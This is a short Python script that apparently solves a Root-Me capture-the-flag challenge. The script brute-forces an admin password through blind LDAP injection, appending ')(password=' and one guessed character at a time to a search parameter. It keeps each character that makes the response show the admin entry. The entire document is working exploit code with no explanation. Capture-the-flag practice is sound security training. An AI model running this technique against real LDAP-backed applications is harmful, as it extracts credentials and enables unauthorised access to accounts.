import requests

print("*" * 20)
print("*" * 4 + "brutforse" + "*" * 4)
mass_iH = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX&#YZ!$%'()*+,-./:;<=>?@[\]^_`{|}~"
password = ''
print("element in brutforse = ",mass_iH)
while(True):
    for i in mass_iH:
        url = "http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin@ch26.challenge01.root-me.org)(password="
        brut = password + i
        otvt = requests.post(url+brut)
        if otvt.text.find("sn : admin") != -1:
            password += i
            print("True =  ",password)
            break
        else:
            print("Error.......", password + i)
